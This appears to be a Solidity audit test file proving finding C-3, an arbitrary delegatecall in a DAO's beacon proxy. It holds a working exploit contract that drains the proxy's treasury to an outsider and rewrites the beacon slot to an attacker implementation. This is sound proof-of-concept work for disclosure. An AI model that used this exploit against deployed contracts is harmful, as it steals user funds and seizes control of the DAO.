// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {StorageSlot} from "@openzeppelin/contracts/utils/StorageSlot.sol";

import {VBeaconProxy} from "contracts/VBeaconProxy.sol";

import {DAOTestBase} from "./Base.t.sol";

/// @notice Implementation that the attacker points the hijacked proxy to.
contract EvilImplementation {
    function pwned() external pure returns (bool) {
        return true;
    }
}

contract EvilBeacon {
    address public immutable implementation;

    constructor(address implementation_) {
        implementation = implementation_;
    }
}

/// @notice Calls `__fallback` on the proxy. The proxy then delegatecalls back into this contract,
/// so `fallback` below runs with the proxy's storage and balance.
contract ProxyHijacker {
    /// @dev bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1)
    bytes32 private constant BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;

    address payable private immutable beneficiary;
    address private immutable evilBeacon;

    constructor(address payable beneficiary_, address evilBeacon_) {
        beneficiary = beneficiary_;
        evilBeacon = evilBeacon_;
    }

    function attack(address proxy) external {
        VBeaconProxy(payable(proxy)).__fallback();
    }

    fallback() external payable {
        // Here `address(this)` is the proxy.
        beneficiary.transfer(address(this).balance);
        StorageSlot.getAddressSlot(BEACON_SLOT).value = evilBeacon;
    }
}

/// @title C-3. Arbitrary delegatecall in VBeaconProxy
/// @notice `VBeaconProxy.__fallback()` is public and delegatecalls `msg.sender`, so any contract
/// can run its own code in the proxy's context.
contract C3_ProxyControlledDelegatecall is DAOTestBase {
    bytes32 internal constant BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;

    function test_C3_ProxyControlledDelegatecall() public {
        vm.deal(address(dao), 10 ether);
        assertEq(address(uint160(uint256(vm.load(address(dao), BEACON_SLOT)))), address(beacon));

        // An account with no voting tokens and no roles takes over the DAO in one transaction.
        address outsider = makeAddr("outsider");
        vm.startPrank(outsider);
        EvilBeacon evilBeacon = new EvilBeacon(address(new EvilImplementation()));
        ProxyHijacker hijacker = new ProxyHijacker(payable(outsider), address(evilBeacon));
        hijacker.attack(address(dao));
        vm.stopPrank();

        // The treasury is drained...
        assertEq(outsider.balance, 10 ether);
        assertEq(address(dao).balance, 0);

        // ...and the proxy now runs the attacker's implementation instead of VotingDAOV2.
        assertEq(address(uint160(uint256(vm.load(address(dao), BEACON_SLOT)))), address(evilBeacon));
        assertTrue(EvilImplementation(address(dao)).pwned());
    }
}
